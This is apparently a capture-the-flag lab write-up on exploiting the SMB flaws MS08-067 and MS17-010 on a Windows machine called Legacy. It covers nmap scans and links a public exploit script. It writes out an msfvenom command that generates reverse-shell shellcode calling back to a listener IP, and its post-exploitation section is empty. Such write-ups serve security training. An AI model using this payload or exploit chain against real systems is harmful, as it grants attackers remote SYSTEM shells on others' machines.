![legacy](https://user-images.githubusercontent.com/43796175/105492077-5e740680-5c85-11eb-8224-07901100704c.jpg)

## LEGACY: Write Up

In this machine i learn about MS-08-067 (CVE-2008-4250) and MS-17-010 (CVE-2017-0143), two exploits of SMB. Exploit this vulnerability manually is simple.

# 01: Information Gathering

First of all i ran nmap with basic commands and i saw two open ports and one closed:

![nmap](https://user-images.githubusercontent.com/43796175/105779180-cf444880-5f3b-11eb-8233-22831472876c.jpg)

Then i did a deeper scan with nmap against 445 port:

![smbnmap](https://user-images.githubusercontent.com/43796175/105779606-b5573580-5f3c-11eb-87a3-a4b20fd80a5b.jpg)
![smbnmap02](https://user-images.githubusercontent.com/43796175/105779613-b7b98f80-5f3c-11eb-86f4-92610487a8b2.jpg)

Nmap showed MS08-067 (CVE-2008-4250) and MS-17-010 (CVE-2017-0143) are very interesting to exploit.

# 02: Threat Modeling

In my mental map smbclient and smbmap were the first option to test, but without results:

![smbno](https://user-images.githubusercontent.com/43796175/105781825-3d3f3e80-5f41-11eb-8e15-73347d9c62f0.jpg)


# 03: Vulnerability Analysis

Both of these vulnerabilities (MS08-067 & MS-17-010) gives a shell as system and each one have a metasploit module for exploit easily but i will show how exploit this manually.

# 04: Exploitation

MS08-067: I will use [this exploit](https://github.com/andyacer/ms08_067) for exploit the vulnerability, this script requires impacket and replace the default shellcode with some of my own. Ok, to make the shellcode i used *msfvenom*:

`
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
`

# 05: Post-Exploitation


